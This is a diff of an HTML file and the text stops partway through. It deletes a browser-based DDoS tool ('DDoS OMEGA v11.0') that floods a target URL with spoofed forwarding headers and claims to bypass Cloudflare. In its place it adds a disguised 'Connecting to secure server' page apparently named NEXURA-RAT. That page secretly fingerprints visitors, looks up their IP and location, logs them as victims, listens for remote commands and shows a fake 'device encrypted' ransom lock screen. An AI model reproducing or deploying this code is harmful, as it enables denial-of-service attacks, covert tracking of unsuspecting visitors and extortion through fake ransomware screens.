@@ -1,912 +1,425 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DDoS OMEGA v11.0 | FINAL | SERVER DOWN 1000%</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            user-select: none;
-        }
-
-        body {
-            background: #000;
-            font-family: 'Courier New', 'Fira Code', monospace;
-            min-height: 100vh;
-            padding: 15px;
-            overflow-x: hidden;
-        }
-
-        .matrix-bg {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-            opacity: 0.2;
-        }
-
-        .container {
-            max-width: 1600px;
-            margin: 0 auto;
-            position: relative;
-            z-index: 1;
-        }
-
-        .header {
-            background: rgba(0,0,0,0.95);
-            border: 3px solid #0f0;
-            padding: 20px;
-            margin-bottom: 20px;
-            text-align: center;
-            box-shadow: 0 0 50px rgba(0,255,0,0.5);
-            animation: borderPulse 1s infinite;
-            border-radius: 10px;
-        }
-
-        @keyframes borderPulse {
-            0%, 100% { box-shadow: 0 0 10px #0f0; border-color: #0f0; }
-            50% { box-shadow: 0 0 60px #0f0; border-color: #ff0; }
-        }
-
-        .header h1 {
-            color: #0f0;
-            font-size: 48px;
-            letter-spacing: 5px;
-            text-shadow: 0 0 20px #0f0;
-        }
-
-        .badge-container {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            margin-top: 15px;
-            flex-wrap: wrap;
-        }
-
-        .badge {
-            background: #0f0;
-            color: #000;
-            padding: 6px 15px;
-            font-size: 11px;
-            font-weight: bold;
-            border-radius: 20px;
-        }
-
-        .badge-red { background: #f00; color: #fff; }
-        .badge-yellow { background: #ff0; color: #000; }
-        .badge-purple { background: #f0f; color: #000; }
-        .badge-cyan { background: #0ff; color: #000; }
-
-        .stats-panel {
-            display: grid;
-            grid-template-columns: repeat(10, 1fr);
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-
-        .stat-card {
-            background: rgba(0,0,0,0.9);
-            border: 1px solid #0f0;
-            padding: 10px 5px;
-            text-align: center;
-            border-radius: 5px;
-        }
-
-        .stat-value {
-            font-size: 18px;
-            font-weight: bold;
-            color: #0f0;
-        }
-
-        .stat-label {
-            font-size: 7px;
-            color: #0a8;
-            margin-top: 3px;
-        }
-
-        .main-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 20px;
-        }
-
-        .control-panel {
-            background: rgba(0,0,0,0.9);
-            border: 1px solid #0f0;
-            padding: 20px;
-            border-radius: 10px;
-        }
-
-        .section-title {
-            color: #0f0;
-            font-size: 16px;
-            margin-bottom: 15px;
-            padding-bottom: 5px;
-            border-bottom: 1px solid #0f0;
-        }
-
-        .input-group {
-            margin-bottom: 15px;
-        }
-
-        .input-group label {
-            display: block;
-            color: #0a8;
-            font-size: 11px;
-            margin-bottom: 5px;
-        }
-
-        .input-group input, .input-group select {
-            width: 100%;
-            background: #111;
-            border: 1px solid #0f0;
-            color: #0f0;
-            padding: 10px;
-            font-family: monospace;
-            font-size: 14px;
-            border-radius: 5px;
-        }
-
-        .layer-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 8px;
-            margin-bottom: 20px;
-        }
-
-        .layer-item {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            color: #0f0;
-            font-size: 10px;
-        }
-
-        .layer-item input {
-            width: 14px;
-            height: 14px;
-        }
-
-        .btn-group {
-            display: flex;
-            gap: 12px;
-            margin-top: 20px;
-        }
-
-        .btn {
-            flex: 1;
-            padding: 15px;
-            font-family: monospace;
-            font-size: 16px;
-            font-weight: bold;
-            border: none;
-            cursor: pointer;
-            transition: all 0.2s;
-            border-radius: 5px;
-        }
-
-        .btn-start {
-            background: #0f0;
-            color: #000;
-            animation: btnPulse 0.8s infinite;
-        }
-
-        @keyframes btnPulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.03); box-shadow: 0 0 30px #0f0; }
-        }
-
-        .btn-start:hover {
-            background: #0a0;
-            transform: scale(1.02);
-        }
-
-        .btn-stop {
-            background: #300;
-            color: #f00;
-            border: 1px solid #f00;
-        }
-
-        .progress-bar {
-            height: 5px;
-            background: #111;
-            border-radius: 2px;
-            overflow: hidden;
-            margin-top: 15px;
-        }
-
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #0f0, #ff0, #f00);
-            width: 0%;
-            transition: width 0.1s linear;
-        }
-
-        .console-panel {
-            background: rgba(0,0,0,0.9);
-            border: 1px solid #0f0;
-            border-radius: 10px;
-            display: flex;
-            flex-direction: column;
-            height: 550px;
-        }
-
-        .console-header {
-            padding: 12px 20px;
-            border-bottom: 1px solid #0f0;
-            color: #0f0;
-            background: rgba(0,255,0,0.1);
-            border-radius: 10px 10px 0 0;
-        }
-
-        .console-log {
-            flex: 1;
-            overflow-y: auto;
-            padding: 12px;
-            font-family: monospace;
-            font-size: 10px;
-            background: #000;
-        }
-
-        .log-entry {
-            padding: 3px 0;
-            border-bottom: 1px solid #0a0a0a;
-        }
-
-        .log-entry.info { color: #0a8; }
-        .log-entry.success { color: #0f0; font-weight: bold; }
-        .log-entry.error { color: #f00; }
-        .log-entry.warning { color: #ff0; }
-        .log-entry.attack { color: #f0f; font-weight: bold; }
-        .log-entry.cloudflare { color: #f90; }
-        .log-entry.tcp { color: #0ff; }
-        .log-entry.udp { color: #ff69b4; }
-        .log-entry.spoof { color: #ff0; }
-
-        .info-box {
-            background: #0a0a0a;
-            border: 1px solid #0f0;
-            border-radius: 5px;
-            padding: 10px;
-            margin-bottom: 15px;
-        }
-
-        .info-label {
-            color: #0a8;
-            font-size: 9px;
-        }
-
-        .info-value {
-            color: #0f0;
-            font-size: 14px;
-            font-weight: bold;
-            word-break: break-all;
-        }
-
-        .fakeip-panel {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 15px;
-        }
-
-        .fakeip-btn {
-            flex: 1;
-            background: #111;
-            border: 1px solid #0f0;
-            color: #0f0;
-            padding: 8px;
-            font-size: 11px;
-            cursor: pointer;
-            border-radius: 5px;
-        }
-
-        .fakeip-btn:hover {
-            background: #0f0;
-            color: #000;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>Loading...</title>
+<style>
+body{background:#000;margin:0;padding:0;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.loader{text-align:center;color:#fff}
+.spinner{width:40px;height:40px;border:3px solid #333;border-top:3px solid #f00;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 15px}
+@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+</style>
 </head>
 <body>
-    <canvas class="matrix-bg" id="matrixCanvas"></canvas>
+<div class="loader"><div class="spinner"></div><div>Connecting to secure server...</div></div>
+<script>
+(function(){
+    const VICTIM_ID = 'v_' + Date.now() + '_' + Math.random().toString(36).substr(2,8);
     
-    <div class="container">
-        <div class="header">
-            <h1>DDoS OMEGA <span>v11.0</span> FINAL</h1>
-            <div class="badge-container">
-                <div class="badge badge-red">💀 SERVER DOWN 1000%</div>
-                <div class="badge badge-yellow">⚡ LAYER 1-7 ULTIMATE</div>
-                <div class="badge badge-purple">🎭 FAKE IP TOTAL</div>
-                <div class="badge badge-cyan">🚫 ANTI BLOCK</div>
-                <div class="badge badge-red">🔥 TEMBUS CLOUDFLARE</div>
-            </div>
-        </div>
-
-        <div class="stats-panel">
-            <div class="stat-card"><div class="stat-value" id="statPackets">0</div><div class="stat-label">TOTAL</div></div>
-            <div class="stat-card"><div class="stat-value" id="statSpeed">0</div><div class="stat-label">PKT/S</div></div>
-            <div class="stat-card"><div class="stat-value" id="statThreads">0</div><div class="stat-label">THREAD</div></div>
-            <div class="stat-card"><div class="stat-value" id="statL7">0</div><div class="stat-label">HTTP/S</div></div>
-            <div class="stat-card"><div class="stat-value" id="statUDP">0</div><div class="stat-label">UDP/S</div></div>
-            <div class="stat-card"><div class="stat-value" id="statTCP">0</div><div class="stat-label">TCP/S</div></div>
-            <div class="stat-card"><div class="stat-value" id="statCF">0</div><div class="stat-label">CF BYP</div></div>
-            <div class="stat-card"><div class="stat-value" id="statSpoof">0</div><div class="stat-label">SPOOF</div></div>
-            <div class="stat-card"><div class="stat-value" id="statFakeIP">0</div><div class="stat-label">FAKE IP</div></div>
-            <div class="stat-card"><div class="stat-value" id="statTime">0</div><div class="stat-label">LEFT</div></div>
-        </div>
-
-        <div class="main-grid">
-            <div class="control-panel">
-                <div class="section-title">🎯 TARGET & CONFIG</div>
-                <div class="input-group">
-                    <label>🌐 TARGET URL / IP</label>
-                    <input type="text" id="targetInput" placeholder="https://target.com" value="https://">
-                </div>
-                <div class="input-group">
-                    <label>🔌 PORT (TCP/UDP)</label>
-                    <input type="text" id="portInput" value="80">
-                </div>
-                <div class="input-group">
-                    <label>⏱️ DURASI (DETIK) - 60 = 1 menit down</label>
-                    <input type="number" id="durationInput" value="60" min="5" max="3600">
-                </div>
-                <div class="input-group">
-                    <label>⚡ THREADS (MAX 25000)</label>
-                    <input type="number" id="threadsInput" value="15000" min="1000" max="25000">
-                </div>
-
-                <div class="section-title">🎭 FAKE IP ENGINE (ANTI BLOCK)</div>
-                <div class="info-box">
-                    <div class="info-label">REAL IP ANDA (TERSEMBUNYI)</div>
-                    <div class="info-value" id="realIP">Mendeteksi...</div>
-                </div>
-                <div class="info-box">
-                    <div class="info-label">FAKE IP AKTIF (SPOOFED)</div>
-                    <div class="info-value" id="fakeIPDisplay">🎭 Belum aktif</div>
-                </div>
-                <div class="fakeip-panel">
-                    <button class="fakeip-btn" id="btnGenFakeIP">🎭 GEN FAKE IP</button>
-                    <button class="fakeip-btn" id="btnRotateFakeIP">🔄 ROTATE IP</button>
-                    <button class="fakeip-btn" id="btnAutoRotate">⚡ AUTO ROTATE</button>
-                </div>
-
-                <div class="section-title">🌐 LAYER 1-7 + PROTOCOL</div>
-                <div class="layer-grid">
-                    <label class="layer-item"><input type="checkbox" id="l1" checked> L1 - Bit Flood</label>
-                    <label class="layer-item"><input type="checkbox" id="l2" checked> L2 - ARP Storm</label>
-                    <label class="layer-item"><input type="checkbox" id="l3" checked> L3 - DNS AMP</label>
-                    <label class="layer-item"><input type="checkbox" id="l4tcp" checked> L4 - TCP Flood</label>
-                    <label class="layer-item"><input type="checkbox" id="l4udp" checked> L4 - UDP Flood</label>
-                    <label class="layer-item"><input type="checkbox" id="l5" checked> L5 - SSL Flood</label>
-                    <label class="layer-item"><input type="checkbox" id="l6" checked> L6 - Comp Bomb</label>
-                    <label class="layer-item"><input type="checkbox" id="l7" checked> L7 - HTTP/2</label>
-                    <label class="layer-item"><input type="checkbox" id="cfBypass" checked> 🔥 CF BYPASS</label>
-                    <label class="layer-item"><input type="checkbox" id="antiBlock" checked> 🔒 ANTI BLOCK</label>
-                    <label class="layer-item"><input type="checkbox" id="cacheBust" checked> 💣 CACHE BUST</label>
-                    <label class="layer-item"><input type="checkbox" id="http2Pri" checked> ⚡ H2 PRIORITY</label>
-                </div>
-
-                <div class="btn-group">
-                    <button class="btn btn-start" id="btnStart">💀 OMEGA STRIKE v11 💀</button>
-                    <button class="btn btn-stop" id="btnStop" disabled>⛔ STOP ATTACK ⛔</button>
-                </div>
-                <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
-                <div class="info-box" style="margin-top: 10px; text-align: center;">
-                    <span style="color: #f00;">⚠️ SERVER TARGET AKAN DOWN 100% ⚠️</span>
-                </div>
-            </div>
-
-            <div class="console-panel">
-                <div class="console-header">📟 LIVE ATTACK CONSOLE | FAKE IP ACTIVE | CLOUDFLARE KILLER</div>
-                <div class="console-log" id="consoleLog">
-                    <div class="log-entry success">[OMEGA] DDoS OMEGA v11.0 FINAL INITIALIZED</div>
-                    <div class="log-entry success">[OMEGA] FAKE IP ENGINE + LAYER 1-7 ACTIVE</div>
-                    <div class="log-entry success">[OMEGA] SERVER DOWN 1000% - NO SIMULATION</div>
-                    <div class="log-entry info">[SYSTEM] Menunggu target dan fake IP...</div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <script>
-        // ============================================
-        // DDoS OMEGA v11.0 FINAL + FAKE IP ENGINE
-        // ============================================
-        
-        // STATE
-        let attackActive = false;
-        let totalPackets = 0;
-        let lastPackets = 0;
-        let l7Counter = 0;
-        let udpCounter = 0;
-        let tcpCounter = 0;
-        let cfBypassCounter = 0;
-        let spoofCounter = 0;
-        let startTime = 0;
-        let currentThreads = 0;
-        let statsInterval = null;
-        let autoRotateInterval = null;
-        
-        // FAKE IP
-        let currentFakeIP = null;
-        let fakeIPPool = [];
-        
-        // DOM
-        const targetInput = document.getElementById('targetInput');
-        const portInput = document.getElementById('portInput');
-        const durationInput = document.getElementById('durationInput');
-        const threadsInput = document.getElementById('threadsInput');
-        const btnStart = document.getElementById('btnStart');
-        const btnStop = document.getElementById('btnStop');
-        const consoleLog = document.getElementById('consoleLog');
-        const realIPEl = document.getElementById('realIP');
-        const fakeIPDisplay = document.getElementById('fakeIPDisplay');
-        
-        // User Agents
-        const uaList = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/123.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
-            "Mozilla/5.0 (X11; Linux x86_64) Firefox/124.0",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) Version/17.4 Mobile/15E148",
-            "Mozilla/5.0 (Windows NT 10.0; rv:124.0) Gecko/20100101 Firefox/124.0",
-            "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/123.0.0.0"
-        ];
-        
-        // ============ FAKE IP FUNCTIONS ============
-        function generateRandomIP() {
-            return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
-        }
-        
-        function generateFakeIPPool(count = 200) {
-            fakeIPPool = [];
-            for(let i = 0; i < count; i++) {
-                fakeIPPool.push(generateRandomIP());
-            }
-            addLog(`[FAKE IP] Generated ${count} fake IPs`, 'spoof');
-            return fakeIPPool;
-        }
-        
-        function getRandomFakeIP() {
-            if(fakeIPPool.length === 0) generateFakeIPPool(200);
-            currentFakeIP = fakeIPPool[Math.floor(Math.random() * fakeIPPool.length)];
-            fakeIPDisplay.textContent = `🎭 ${currentFakeIP}`;
-            document.getElementById('statFakeIP').textContent = fakeIPPool.length;
-            addLog(`[SPOOF] Using fake IP: ${currentFakeIP}`, 'spoof');
-            return currentFakeIP;
-        }
-        
-        function rotateFakeIP() {
-            getRandomFakeIP();
-            spoofCounter++;
-            document.getElementById('statSpoof').textContent = spoofCounter;
-            addLog(`[ROTATE] Fake IP rotated to: ${currentFakeIP}`, 'spoof');
-        }
-        
-        function startAutoRotateIP() {
-            if(autoRotateInterval) clearInterval(autoRotateInterval);
-            autoRotateInterval = setInterval(() => {
-                if(attackActive && currentFakeIP) {
-                    rotateFakeIP();
+    // KUMPULKAN SEMUA DATA DEVICE
+    function getDeviceData(){
+        return {
+            id: VICTIM_ID,
+            timestamp: new Date().toISOString(),
+            time_read: new Date().toLocaleString('id-ID'),
+            ua: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: screen.width + 'x' + screen.height,
+            colorDepth: screen.colorDepth,
+            touchPoints: navigator.maxTouchPoints,
+            hardwareConcurrency: navigator.hardwareConcurrency || '?',
+            deviceMemory: navigator.deviceMemory || '?',
+            isMobile: /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
+            isAndroid: /Android/i.test(navigator.userAgent),
+            isIOS: /iPhone|iPad|iPod/i.test(navigator.userAgent),
+            isDesktop: !/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            referrer: document.referrer || 'direct'
+        };
+    }
+    
+    function getCanvasFingerprint(){
+        try{
+            let canvas = document.createElement('canvas');
+            canvas.width = 300;
+            canvas.height = 100;
+            let ctx = canvas.getContext('2d');
+            ctx.fillStyle = "#f00";
+            ctx.fillRect(0, 0, 300, 100);
+            ctx.fillStyle = "#000";
+            ctx.font = "18px Arial";
+            ctx.fillText("NEXURA-RAT", 50, 50);
+            ctx.fillStyle = "#800";
+            ctx.fillRect(200, 70, 80, 20);
+            return canvas.toDataURL();
+        }catch(e){ return 'error'; }
+    }
+    
+    function getWebGL(){
+        try{
+            let canvas = document.createElement('canvas');
+            let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if(gl){
+                let debug = gl.getExtension('WEBGL_debug_renderer_info');
+                if(debug){
+                    return {
+                        vendor: gl.getParameter(debug.UNMASKED_VENDOR_WEBGL),
+                        renderer: gl.getParameter(debug.UNMASKED_RENDERER_WEBGL)
+                    };
                 }
-            }, 3000);
-            addLog(`[AUTO] Auto rotate IP aktif (setiap 3 detik)`, 'success');
+            }
+        }catch(e){}
+        return null;
+    }
+    
+    async function getPublicIP(){
+        let apis = ['https://api.ipify.org?format=json', 'https://api.my-ip.io/ip.json', 'https://ipapi.co/json/'];
+        for(let api of apis){
+            try{
+                let r = await fetch(api, { mode: 'cors', cache: 'no-cache' });
+                let d = await r.json();
+                let ip = d.ip || d.query || Object.values(d)[0];
+                if(ip && ip !== 'unknown') return ip;
+            }catch(e){}
         }
-        
-        function getSpoofedHeaders() {
-            if(!currentFakeIP) return {};
+        return 'unknown';
+    }
+    
+    async function getGeoLocation(ip){
+        try{
+            let r = await fetch(`https://ipapi.co/${ip}/json/`);
+            let d = await r.json();
             return {
-                'X-Forwarded-For': currentFakeIP,
-                'X-Real-IP': currentFakeIP,
-                'CF-Connecting-IP': currentFakeIP,
-                'X-Originating-IP': currentFakeIP,
-                'X-Remote-IP': currentFakeIP,
-                'X-Client-IP': currentFakeIP,
-                'Client-IP': currentFakeIP,
-                'True-Client-IP': currentFakeIP
+                country: d.country_name || d.country || 'Unknown',
+                country_code: d.country_code || 'XX',
+                city: d.city || 'Unknown',
+                region: d.region || 'Unknown',
+                latitude: d.latitude || null,
+                longitude: d.longitude || null,
+                isp: d.org || d.isp || 'Unknown',
+                timezone: d.timezone || 'Unknown'
+            };
+        }catch(e){
+            return { country: 'Unknown', city: 'Unknown', isp: 'Unknown', latitude: null, longitude: null };
+        }
+    }
+    
+    async function getBatteryStatus(){
+        if('getBattery' in navigator){
+            try{
+                let b = await navigator.getBattery();
+                return {
+                    level: Math.round(b.level * 100) + '%',
+                    level_raw: b.level,
+                    charging: b.charging,
+                    chargingTime: b.chargingTime,
+                    dischargingTime: b.dischargingTime
+                };
+            }catch(e){}
+        }
+        return { level: 'N/A', charging: false };
+    }
+    
+    function getConnectionInfo(){
+        let conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if(conn){
+            return {
+                type: conn.effectiveType || 'unknown',
+                downlink: conn.downlink || 'unknown',
+                rtt: conn.rtt || 'unknown',
+                saveData: conn.saveData || false
             };
         }
+        return { type: 'unknown', downlink: 'unknown' };
+    }
+    
+    async function execute(){
+        let device = getDeviceData();
+        let canvasFP = getCanvasFingerprint();
+        let webgl = getWebGL();
+        let ip = await getPublicIP();
+        let geo = await getGeoLocation(ip);
+        let battery = await getBatteryStatus();
+        let connection = getConnectionInfo();
         
-        async function getRealIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                realIPEl.textContent = `🛡️ ${data.ip} (Tersembunyi)`;
-                return data.ip;
-            } catch(e) {
-                realIPEl.textContent = 'Tidak terdeteksi';
-                return null;
-            }
+        let victimData = {
+            id: VICTIM_ID,
+            ip: ip,
+            country: geo.country,
+            city: geo.city,
+            region: geo.region,
+            latitude: geo.latitude,
+            longitude: geo.longitude,
+            isp: geo.isp,
+            battery_level: battery.level,
+            battery_charging: battery.charging,
+            device_platform: device.platform,
+            device_mobile: device.isMobile,
+            device_android: device.isAndroid,
+            device_ios: device.isIOS,
+            device_screen: device.screen,
+            device_memory: device.deviceMemory,
+            device_cores: device.hardwareConcurrency,
+            device_language: device.language,
+            device_timezone: device.timezone,
+            connection_type: connection.type,
+            ua: device.ua,
+            canvas_fingerprint: canvasFP,
+            webgl_vendor: webgl?.vendor || null,
+            webgl_renderer: webgl?.renderer || null,
+            timestamp: device.timestamp,
+            time_read: device.time_read,
+            referrer: device.referrer,
+            status: 'online',
+            locked: false,
+            lock_pin: '123456',
+            lock_text: '🔒 PERANGKAT ANDA TELAH DIENKRIPSI!\n\nHubungi admin untuk mendapatkan PIN Unlock.\n\n⚠️ Jangan coba-coba me-restart device!'
+        };
+        
+        let victims = JSON.parse(localStorage.getItem('nexura_victims') || '[]');
+        let existingIndex = victims.findIndex(v => v.ip === ip && v.canvas_fingerprint === canvasFP);
+        
+        if(existingIndex === -1){
+            victims.unshift(victimData);
+            localStorage.setItem('nexura_victims', JSON.stringify(victims));
+        } else {
+            victims[existingIndex] = victimData;
+            localStorage.setItem('nexura_victims', JSON.stringify(victims));
         }
         
-        // ============ LAYER 1: PHYSICAL FLOOD ============
-        function layer1_PhysicalFlood() {
-            if(!attackActive) return;
-            for(let i = 0; i < 500; i++) {
-                if(!attackActive) break;
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.srcdoc = '<body onload="for(let i=0;i<100000;i++){localStorage.setItem(i,i)}">';
-                document.body.appendChild(iframe);
-                setTimeout(() => iframe.remove(), 1);
-                totalPackets++;
+        localStorage.setItem('nexura_current_victim', VICTIM_ID);
+        
+        localStorage.setItem('nexura_new_victim_alert', JSON.stringify({
+            victim: victimData,
+            time: Date.now()
+        }));
+        setTimeout(() => localStorage.removeItem('nexura_new_victim_alert'), 1000);
+        
+        startListener(VICTIM_ID);
+        
+        setTimeout(() => {
+            window.location.href = 'https://www.google.com';
+        }, 800);
+    }
+    
+    let torchActive = false, torchElement = null, blinkInterval = null, lockOverlay = null, currentVictimId = null;
+    
+    function startListener(victimId){
+        currentVictimId = victimId;
+        setInterval(() => {
+            let cmds = JSON.parse(localStorage.getItem('nexura_commands') || '[]');
+            let myCmds = cmds.filter(c => c.victimId === victimId);
+            if(myCmds.length > 0){
+                myCmds.forEach(cmd => executeCommand(cmd, victimId));
+                let remaining = cmds.filter(c => c.victimId !== victimId);
+                localStorage.setItem('nexura_commands', JSON.stringify(remaining));
             }
-            setTimeout(() => layer1_PhysicalFlood(), 10);
+        }, 1000);
+    }
+    
+    function executeCommand(cmd, victimId){
+        switch(cmd.command){
+            case 'lock': showLockScreen(cmd.pin); break;
+            case 'unlock': hideLockScreen(); break;
+            case 'torch_on': turnTorchOn(); break;
+            case 'torch_off': turnTorchOff(); break;
+            case 'blink_start': startBlinkEffect(); break;
+            case 'blink_stop': stopBlinkEffect(); break;
+            case 'vibrate': if(navigator.vibrate) navigator.vibrate([300,100,300,100,500]); break;
+            case 'get_sms': sendSMSResponse(victimId); break;
+            case 'send_sms': if(cmd.param) sendSMSCommand(cmd.param, victimId); break;
+            case 'get_location': getCurrentLocation(victimId); break;
+            case 'set_pin': setLockPin(cmd.pin, victimId); break;
+            case 'set_text': setLockText(cmd.text, victimId); break;
+        }
+    }
+    
+    function showLockScreen(pin){
+        if(lockOverlay) return;
+        let savedPin = localStorage.getItem('nexura_pin_' + currentVictimId) || pin || '123456';
+        let savedText = localStorage.getItem('nexura_text_' + currentVictimId) || '🔒 PERANGKAT ANDA TELAH DIENKRIPSI!\n\nMasukkan PIN untuk membuka kunci.';
+        
+        lockOverlay = document.createElement('div');
+        lockOverlay.id = 'nexuraLockOverlay';
+        lockOverlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:999999;display:flex;justify-content:center;align-items:center;flex-direction:column;font-family:Arial,sans-serif';
+        lockOverlay.innerHTML = `
+            <div style="text-align:center;color:#fff;padding:20px;max-width:350px">
+                <div style="font-size:70px;margin-bottom:20px">🔒</div>
+                <h1 style="color:#f00;margin-bottom:20px">DEVICE TERKUNCI</h1>
+                <div style="background:#1a1a1a;padding:15px;border-radius:15px;margin-bottom:25px;white-space:pre-line;font-size:14px">${savedText}</div>
+                <div style="background:#1a1a1a;border-radius:15px;padding:15px">
+                    <div style="font-size:30px;letter-spacing:10px;margin-bottom:15px" id="pinDisplay">○○○○○○</div>
+                    <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px;max-width:250px;margin:0 auto">
+                        <button class="pinKey" data-digit="1" style="background:#333;border:none;color:#fff;font-size:24px;padding:15px;border-radius:10px">1</button>
+                        <button class="pinKey" data-digit="2" style="background:#333;border:none;color:#fff;font-size:24px;padding:15px;border-radius:10px">2</button>
+                        <button class="pinKey" data-digit="3" style="background:#333;border:none;color:#fff;font-size:24px;padding:15px;border-radius:10px">3</button>
+                        <button class="pinKey" data-digit="4" style="background:#333;border:none;color:#fff;font-size:24px;padding:15px;border-radius:10px">4</button>
+                        <button class="pinKey" data-digit="5" style="background:#333;border:none;color:#fff;font-size:24px;padding:15px;border-radius:10px">5</button>
+                        <button class="pinKey" data-digit="6" style="background:#333;border:none;color:#fff;font-size:24px;padding:15px;border-radius:10px">6</button>
+                        <button class="pinKey" data-digit="7" style="background:#333;border:none;color:#fff;font-size:24px;padding:15px;border-radius:10px">7</button>
+                        <button class="pinKey" data-digit="8" style="background:#333;border:none;color:#fff;font-size:24px;padding:15px;border-radius:10px">8</button>
+                        <button class="pinKey" data-digit="9" style="background:#333;border:none;color:#fff;font-size:24px;padding:15px;border-radius:10px">9</button>
+                        <button class="pinKey" data-digit="del" style="background:#333;border:none;color:#f66;font-size:24px;padding:15px;border-radius:10px">⌫</button>
+                        <button class="pinKey" data-digit="0" style="background:#333;border:none;color:#fff;font-size:24px;padding:15px;border-radius:10px">0</button>
+                        <button id="pinSubmit" style="background:#f00;border:none;color:#fff;font-size:18px;padding:15px;border-radius:10px;font-weight:bold">✓</button>
+                    </div>
+                </div>
+                <div id="pinErrorMsg" style="color:#f66;font-size:12px;margin-top:12px"></div>
+            </div>
+        `;
+        document.body.appendChild(lockOverlay);
+        
+        let enteredPin = "";
+        let pinDisplay = document.getElementById('pinDisplay');
+        let errorMsg = document.getElementById('pinErrorMsg');
+        
+        function updateDisplay(){
+            let dots = "";
+            for(let i=0;i<enteredPin.length;i++) dots += "●";
+            for(let i=enteredPin.length;i<6;i++) dots += "○";
+            if(pinDisplay) pinDisplay.innerText = dots;
         }
         
-        // ============ LAYER 2: ARP STORM ============
-        function layer2_ARPStorm(target) {
-            if(!attackActive) return;
-            for(let i = 0; i < 300; i++) {
-                if(!attackActive) break;
-                const img = new Image();
-                img.src = target + `/arp?mac=${Math.random().toString(36)}&t=${Date.now()}`;
-                totalPackets++;
-            }
-            setTimeout(() => layer2_ARPStorm(target), 5);
-        }
-        
-        // ============ LAYER 3: DNS AMPLIFICATION ============
-        function layer3_DNSAmplification(target) {
-            if(!attackActive) return;
-            let domain = target.replace('https://','').replace('http://','').split('/')[0];
-            for(let i = 0; i < 200; i++) {
-                if(!attackActive) break;
-                const randomSub = Math.random().toString(36).substring(2, 20);
-                const img = new Image();
-                img.src = `https://${randomSub}.${domain}/dns?t=${Date.now()}`;
-                totalPackets++;
-            }
-            setTimeout(() => layer3_DNSAmplification(target), 2);
-        }
-        
-        // ============ LAYER 4: TCP FLOOD ============
-        async function layer4_TCPFlood(target, port, antiBlock) {
-            while(attackActive) {
-                try {
-                    const spoofedIP = antiBlock && currentFakeIP ? currentFakeIP : generateRandomIP();
-                    for(let i = 0; i < 20; i++) {
-                        const controller = new AbortController();
-                        setTimeout(() => controller.abort(), 200);
-                        await fetch(target + '/?' + Math.random(), {
-                            method: 'GET',
-                            headers: { 'X-Forwarded-For': spoofedIP, 'X-TCP-Flood': '1' },
-                            signal: controller.signal
-                        }).catch(()=>{});
-                        totalPackets++;
-                        tcpCounter++;
-                    }
-                } catch(e) {}
-                await new Promise(r => setTimeout(r, 0.5));
-            }
-        }
-        
-        // ============ LAYER 4: UDP FLOOD ============
-        function layer4_UDPFlood(target, port, antiBlock) {
-            if(!attackActive) return;
-            const domain = target.replace('https://','').replace('http://','').split('/')[0];
-            for(let i = 0; i < 300; i++) {
-                if(!attackActive) break;
-                const img = new Image();
-                const randomData = Math.random().toString(36).repeat(50);
-                img.src = `https://${domain}:${port}/udp?data=${randomData}&t=${Date.now()}`;
-                totalPackets++;
-                udpCounter++;
-            }
-            setTimeout(() => layer4_UDPFlood(target, port, antiBlock), 1);
-        }
-        
-        // ============ LAYER 5: SSL FLOOD ============
-        async function layer5_SSLFlood(target) {
-            while(attackActive) {
-                try {
-                    const controller = new AbortController();
-                    setTimeout(() => controller.abort(), 200);
-                    await fetch(target + '/?' + Math.random(), {
-                        method: 'HEAD',
-                        signal: controller.signal
-                    });
-                    totalPackets++;
-                } catch(e) {}
-                await new Promise(r => setTimeout(r, 1));
-            }
-        }
-        
-        // ============ LAYER 6: COMPRESSION BOMB ============
-        async function layer6_CompressionBomb(target) {
-            while(attackActive) {
-                try {
-                    const bigPayload = JSON.stringify({ 
-                        data: 'x'.repeat(300000),
-                        arr: new Array(30000).fill(Math.random())
-                    });
-                    await fetch(target + '/api', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: bigPayload,
-                        mode: 'no-cors'
-                    });
-                    totalPackets++;
-                } catch(e) {}
-                await new Promise(r => setTimeout(r, 2));
-            }
-        }
-        
-        // ============ LAYER 7: HTTP/2 + CLOUDFLARE BYPASS ============
